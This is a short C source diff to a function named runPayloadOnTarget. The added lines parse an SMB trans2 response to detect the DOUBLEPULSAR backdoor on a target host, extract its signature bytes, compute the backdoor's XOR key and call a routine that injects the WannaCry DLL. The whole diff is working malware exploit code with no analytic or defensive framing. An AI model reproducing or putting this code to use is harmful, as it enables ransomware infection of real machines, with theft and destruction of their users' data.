@@ -164,9 +164,16 @@ int runPayloadOnTarget(char *host, u_short hostshort)
 	send(dsock, (char*)trans2_session_setup, sizeof(trans2_session_setup) - 1, 0);
 	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
 	
+	unsigned char signature[4];
 	if (recvbuff[34] == 0x51)
 	{
-		ArchitectureType = 
+		ArchitectureType = recvbuff[22];
+		
+		signature[0] = recvbuff[18];
+		signature[1] = recvbuff[19];
+		signature[2] = recvbuff[20];
+		signature[3] = recvbuff[21];
+		memcpy((unsigned int*)&signature_long, (unsigned int*)&signature, sizeof(unsigned int));
 		XorKey = ComputeDOUBLEPULSARXorKey(signature_long);
 		InjectWannaCryDLLViaDoublePulsarBackdoor(dsock, ArchitectureType, XorKey);
 	}
